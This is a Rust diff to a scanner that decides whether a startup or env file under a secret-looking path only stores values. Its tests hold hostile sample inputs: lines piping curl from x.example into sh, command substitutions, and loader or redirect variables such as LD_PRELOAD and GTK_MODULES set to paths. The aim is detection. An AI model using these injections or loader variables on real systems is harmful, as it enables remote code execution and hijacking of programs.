@@ -385,17 +385,70 @@ const LOADING_NAMES: &[&str] = &[
     "FISH_USER_PATHS",
 ];
 
-/// Whether `name` is a variable's name that may be set to a literal with
-/// nothing run or loaded for it.
-fn is_plain_name(name: &str) -> bool {
+/// Settings that are commonly exported beside secrets and that change
+/// neither what runs nor what is trusted, by name and by how a name ends.
+///
+/// This list, like the names that say secret, is a judgement about noise,
+/// not a proof: it decides only whether a file kept from the AI raises
+/// `kept-from-review`. A name that is missing here costs a finding the
+/// user answers once with `sweep allow`; a name wrongly here would let a
+/// setting pass unsaid, so only names that hold an identifier, a region
+/// or the like are on it. Listing every variable that loads or redirects
+/// something cannot be done, which is why the rule allows by shape and
+/// does not deny by name; `LOADING_NAMES` stays as a backstop.
+const INERT_NAMES: &[&str] = &[
+    "LANG",
+    "TZ",
+    "TERM",
+    "COLORTERM",
+    "USER",
+    "LOGNAME",
+    "HOSTNAME",
+    "EMAIL",
+];
+const INERT_ENDINGS: &[&str] = &[
+    "_ID",
+    "_REGION",
+    "_PROFILE",
+    "_ACCOUNT",
+    "_USER",
+    "_USERNAME",
+    "_NAME",
+    "_ORG",
+    "_PROJECT",
+    "_ENV",
+    "_STAGE",
+    "_TENANT",
+    "_DATABASE",
+    "_DB",
+    "_PORT",
+    "_MODEL",
+];
+
+/// Whether setting the variable `name` to `value` only keeps a value:
+/// the name is one that says secret or is a plainly inert setting, and
+/// the value is an opaque word, not a place or a command (no `/`, no
+/// leading `~` or `.`, no `://`, no blank). A path, an address or any
+/// other variable is more than that, whatever it is called: most of what
+/// redirects a program is a variable set to a path.
+fn keeps_a_value(name: &str, value: &str) -> bool {
     let upper = name.to_ascii_uppercase();
-    name.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_')
-        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
-        && !LOADING_NAMES.contains(&upper.as_str())
-        && !["LD_", "DYLD_", "GIT_CONFIG"]
+    let written = name.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_')
+        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_');
+    let loads = LOADING_NAMES.contains(&upper.as_str())
+        || ["LD_", "DYLD_", "GIT_CONFIG"]
             .iter()
             .any(|start| upper.starts_with(start))
-        && !upper.ends_with("_PROXY")
+        || upper.ends_with("_PROXY");
+    // `PWD` says password as a part of a name; alone it is the shell's.
+    let secret = upper != "PWD" && is_secret_name(name);
+    let inert = INERT_NAMES.contains(&upper.as_str())
+        || upper.starts_with("LC_")
+        || INERT_ENDINGS.iter().any(|ending| upper.ends_with(ending));
+    let opaque = !value.contains(['/', ' ', '\t'])
+        && !value.starts_with(['~', '.'])
+        && !value.contains("://");
+    written && !loads && (secret || inert) && opaque
 }
 
 /// The words of `line`, each with where it starts, quotes taken off; `None`
@@ -429,36 +482,41 @@ fn literal_words(line: &str) -> Option<Vec<(usize, String)>> {
     Some(words)
 }
 
-/// Whether the word of `line` that starts at `at` is written as
-/// `NAME=…`, the name plain and outside quotes.
-fn assigns(line: &str, at: usize) -> bool {
-    line[at..]
-        .split_once('=')
-        .is_some_and(|(name, _)| is_plain_name(name))
+/// Whether the word `word` of `line`, which starts at `at`, is written as
+/// `NAME=value` with the name outside quotes, and only keeps a value.
+fn assigns(line: &str, (at, word): &(usize, String)) -> bool {
+    let named = line[*at..].split_once('=').map(|(name, _)| name);
+    word.split_once('=')
+        .is_some_and(|(name, value)| named == Some(name) && keeps_a_value(name, value))
 }
 
-/// Whether `line` does nothing but set variables to literals, in the forms
-/// a shell, fish, Hyprland or an environment file writes that:
-/// `NAME=value` (several on a line, after `export` too), `set -gx NAME
-/// value`, `env = NAME,value` and `$name = value`. A blank line and a
-/// comment do nothing at all.
+/// Whether `line` does nothing but keep a value in a variable (see
+/// `keeps_a_value`), in the forms a shell, fish, Hyprland or an
+/// environment file writes that: `NAME=value` (several on a line, after
+/// `export` too), `set -gx NAME value`, `env = NAME,value` and `$name =
+/// value`. A blank line and a comment do nothing at all.
 fn sets_a_variable(line: &str) -> bool {
     let line = line.trim();
     if line.is_empty() || line.starts_with('#') {
         return true;
     }
     // Hyprland's own variable: the one place a `$` is no expansion.
-    let line = match line.strip_prefix('$') {
-        Some(named) => {
-            let Some((name, value)) = named.split_once('=') else {
-                return false;
-            };
-            return is_plain_name(name.trim()) && literal_words(value).is_some();
-        }
-        None => line,
-    };
+    if let Some(named) = line.strip_prefix('$') {
+        return named.split_once('=').is_some_and(|(name, value)| {
+            literal_words(value).is_some_and(|words| match words.as_slice() {
+                [] => keeps_a_value(name.trim(), ""),
+                [(_, value)] => keeps_a_value(name.trim(), value),
+                _ => false,
+            })
+        });
+    }
     let Some(words) = literal_words(line) else {
         return false;
+    };
+    let hyprland = |setting: &str| {
+        setting
+            .split_once(',')
+            .is_some_and(|(name, value)| keeps_a_value(name.trim(), value.trim()))
     };
     let word = |index: usize| words.get(index).map(|(_, word)| word.as_str());
     match word(0) {
@@ -466,32 +524,35 @@ fn sets_a_variable(line: &str) -> bool {
         Some("env")
             if word(1) == Some("=") || word(1).is_some_and(|next| next.starts_with('=')) =>
         {
-            line.split_once('=').is_some_and(|(_, setting)| {
-                setting
-                    .split_once(',')
-                    .is_some_and(|(name, _)| is_plain_name(name.trim()))
-            })
+            line.split_once('=')
+                .is_some_and(|(_, setting)| hyprland(setting))
         }
-        Some(joined) if joined.starts_with("env=") => joined["env=".len()..]
-            .split_once(',')
-            .is_some_and(|(name, _)| is_plain_name(name)),
-        // fish: `set [-flags] NAME value…`.
-        Some("set") => words
-            .iter()
-            .skip(1)
-            .map(|(_, word)| word.as_str())
-            .find(|word| !word.starts_with('-'))
-            .is_some_and(is_plain_name),
-        Some("export") => words.len() > 1 && words[1..].iter().all(|(at, _)| assigns(line, *at)),
-        Some(_) => words.iter().all(|(at, _)| assigns(line, *at)),
+        Some(joined) if joined.starts_with("env=") => hyprland(&joined["env=".len()..]),
+        // fish: `set [-flags] NAME value`.
+        Some("set") => {
+            let rest: Vec<&str> = words
+                .iter()
+                .skip(1)
+                .map(|(_, word)| word.as_str())
+                .skip_while(|word| word.starts_with('-'))
+                .collect();
+            match rest.as_slice() {
+                [name] => keeps_a_value(name, ""),
+                [name, value] => keeps_a_value(name, value),
+                _ => false,
+            }
+        }
+        Some("export") => words.len() > 1 && words[1..].iter().all(|word| assigns(line, word)),
+        Some(_) => words.iter().all(|word| assigns(line, word)),
         None => true,
     }
 }
 
-/// Whether `text` does nothing but set variables to literals (see
-/// `sets_a_variable`): a file a shell reads in can hold any command, and
-/// the ordinary one under a secret-looking path holds only these. When in
-/// doubt it does not: a line this does not know counts as a command.
+/// Whether every line of `text` only keeps a value in a secret-named or
+/// plainly inert variable (see `sets_a_variable`): a file a shell reads in
+/// can hold any command and redirect any program, and the ordinary one
+/// under a secret-looking path holds only such lines. Any other line, any
+/// other variable and any value that is a place makes it more than that.
 fn sets_only_variables(text: &str) -> bool {
     text.lines().all(sets_a_variable)
 }
@@ -1567,20 +1628,23 @@ mod tests {
 
     #[test]
     fn a_line_that_only_sets_a_variable_to_a_literal_is_told_from_a_command() {
-        use super::{sets_a_variable, sets_only_variables};
+        use super::sets_a_variable;
         for line in [
             "",
             "# a comment",
             "TOKEN=abc123",
-            "export TOKEN=abc123",
-            "export A=1 B=two",
-            "A=1 B=2",
-            "TOKEN='p@ss w0rd!'",
-            "export NAME=\"two words\"",
-            "set -gx TOKEN abc123",
-            "set -x TOKEN 'two words'",
-            "env = TOKEN,abc123",
-            "env=TOKEN,abc123",
+            "export OPENAI_API_KEY=sk-0123456789abcdef",
+            "export AWS_PROFILE=work AWS_DEFAULT_REGION=eu-west-1",
+            "AWS_ACCESS_KEY_ID=AKIA0123456789 AWS_SECRET_ACCESS_KEY=abcdef",
+            "DB_PASSWORD='p@ssw0rd!'",
+            "export ANTHROPIC_MODEL=\"some-model\"",
+            "LANG=en_GB.UTF-8",
+            "LC_ALL=C",
+            "DB_PORT=5432",
+            "set -gx GITHUB_TOKEN ghp_0123456789",
+            "set -x OPENAI_ORG_ID org-123",
+            "env = API_TOKEN,abc123",
+            "env=API_TOKEN,abc123",
             "$token = abc123",
         ] {
             assert!(sets_a_variable(line), "{line}");
@@ -1588,8 +1652,8 @@ mod tests {
         for line in [
             "TOKEN=$(curl https://x.example/p|sh)",
             "KEY=abc curl https://x.example/p | sh",
-            "export A=1; curl https://x.example/p|sh",
-            "A=1 && curl x",
+            "export A_TOKEN=1; curl https://x.example/p|sh",
+            "A_TOKEN=1 && curl x",
             "TOKEN=`id`",
             "TOKEN=\"$HOME/x\"",
             "TOKEN=abc \\",
@@ -1604,28 +1668,129 @@ mod tests {
             "curl https://x.example/p",
             "export -f f",
             "export TOKEN",
-            "\"A\"=1",
+            "\"TOKEN\"=1",
             "set -e",
             "set -x TOKEN (curl x)",
+            "set -x TOKEN a b",
             "declare -x TOKEN=abc",
             "env = TOKEN,$(id)",
             "$token = $(id)",
             "exec-once = curl x",
-            // What decides what runs or is loaded is no plain value.
-            "PATH=/tmp/x",
-            "export LD_PRELOAD=/tmp/x.so",
-            "PROMPT_COMMAND='curl x.example'",
-            "set -x fish_user_paths /tmp/x",
-            "env = LD_PRELOAD,/tmp/x.so",
-            "https_proxy=http://10.0.0.1:3128",
+            // A value that is a place, whatever the variable is called.
+            "API_TOKEN=/tmp/x",
+            "API_TOKEN=~/x",
+            "API_TOKEN=./x",
+            "API_KEY=https://x.example/k",
+            "DB_PASSWORD='two words'",
+            // Any other variable, and the shell's own `PWD`.
+            "A=1",
+            "EDITOR=vim",
+            "PWD=abc",
+            "$terminal = kitty",
+            // What decides what runs or is loaded, though its name ends
+            // like an inert one.
+            "BASH_ENV=abc",
+            "export LD_PRELOAD=x.so",
+            "PROMPT_COMMAND='curl'",
+            "set -x fish_user_paths x",
+            "env = LD_PRELOAD,x.so",
+            "https_proxy=10.0.0.1:3128",
         ] {
             assert!(!sets_a_variable(line), "{line}");
         }
+    }
+
+    #[test]
+    fn a_variable_that_loads_or_redirects_is_no_plain_value_without_being_named() {
+        use super::{sets_a_variable, sets_only_variables};
+        // Each is a variable set to a path or a word, and none is a
+        // secret's or an inert setting's name.
+        for name in [
+            "GCONV_PATH",
+            "LOCPATH",
+            "NLSPATH",
+            "GTK_MODULES",
+            "GTK_PATH",
+            "GIO_EXTRA_MODULES",
+            "GST_PLUGIN_PATH",
+            "QT_PLUGIN_PATH",
+            "LIBGL_DRIVERS_PATH",
+            "VK_LAYER_PATH",
+            "VK_ADD_LAYER_PATH",
+            "CLASSPATH",
+            "RUSTC_WRAPPER",
+            "CC",
+            "CXX",
+            "LD",
+            "MAKEFLAGS",
+            "GOFLAGS",
+            "GEM_HOME",
+            "GEM_PATH",
+            "LESSOPEN",
+            "LESSCLOSE",
+            "MANPAGER",
+            "GIT_PAGER",
+            "GIT_EXTERNAL_DIFF",
+            "GIT_PROXY_COMMAND",
+            "GIT_TEMPLATE_DIR",
+            "XDG_CONFIG_HOME",
+            "XDG_CONFIG_DIRS",
+            "XDG_DATA_DIRS",
+            "HOME",
+            "GNUPGHOME",
+            "OPENSSL_CONF",
+            "WGETRC",
+            "CURL_HOME",
+            "CDPATH",
+            "INPUTRC",
+            "TERMINFO",
+            "TERMCAP",
+            "HISTFILE",
+            "SSL_CERT_FILE",
+            "SSL_CERT_DIR",
+            "CURL_CA_BUNDLE",
+            "REQUESTS_CA_BUNDLE",
+            "NODE_EXTRA_CA_CERTS",
+            "HOSTALIASES",
+            "RESOLV_HOST_CONF",
+            "GLIBC_TUNABLES",
+            "MALLOC_TRACE",
+            "DOCKER_HOST",
+            "KUBECONFIG",
+            "AWS_ENDPOINT_URL",
+        ] {
+            for value in ["/home/u/.cache/x", "evil"] {
+                for line in [
+                    format!("{name}={value}"),
+                    format!("export {name}={value}"),
+                    format!("set -gx {name} {value}"),
+                    format!("env = {name},{value}"),
+                ] {
+                    assert!(!sets_a_variable(&line), "{line}");
+                }
+            }
+        }
+        // Ten real tokens and one such line.
+        let tokens: Vec<String> = (0..10)
+            .map(|number| format!("export SERVICE{number}_API_TOKEN=tok{number}abcdefgh"))
+            .collect();
+        let tokens = tokens.join("\n");
+        assert!(sets_only_variables(&tokens));
+        assert!(!sets_only_variables(&format!(
+            "{tokens}\nGTK_MODULES=evil\n"
+        )));
+    }
+
+    #[test]
+    fn a_quoted_value_that_runs_over_a_line_hides_nothing() {
+        use super::sets_only_variables;
         // A quoted value that runs on over a line hides nothing.
         assert!(!sets_only_variables(
             "TOKEN='abc\ncurl https://x.example/p | sh\n'\n"
         ));
-        assert!(sets_only_variables("# keys\nexport A=abc\n\nB='c d'\n"));
+        assert!(sets_only_variables(
+            "# keys\nexport A_KEY=abc\n\nB_TOKEN='c-d'\n"
+        ));
     }
 
     /// Files under secret-looking paths, by how each is reached.
@@ -1951,7 +2116,7 @@ mod tests {
                 ("home/u/.config/secrets/run.sh", "#!/bin/sh\ntrue\n"),
                 ("home/u/bin/token-refresh.sh", "#!/bin/sh\ntrue\n"),
                 ("home/u/.ssh/rc", "true\n"),
-                ("home/u/.env", "X=1\n"),
+                ("home/u/.env", "API_TOKEN=abcdefgh\n"),
                 (
                     "home/u/.config/systemd/user/a.service",
                     "[Service]\nExecStart=%h/.gnupg/gpg-wrapper\nExecStartPost=%h/.config/secrets/run.sh\n",
@@ -2008,8 +2173,8 @@ mod tests {
                 "~/bin/token-refresh.sh",
             ]
         );
-        // (`~/.env`, which a start-up file reads in, only sets a variable
-        // to a literal: it is no finding.)
+        // (`~/.env`, which a start-up file reads in, only keeps a token in a
+        // variable: it is no finding.)
         // One the user allowed is quiet.
         for item in &mut collection.items {
             if item.path == "home/u/.gnupg/gpg-wrapper" {
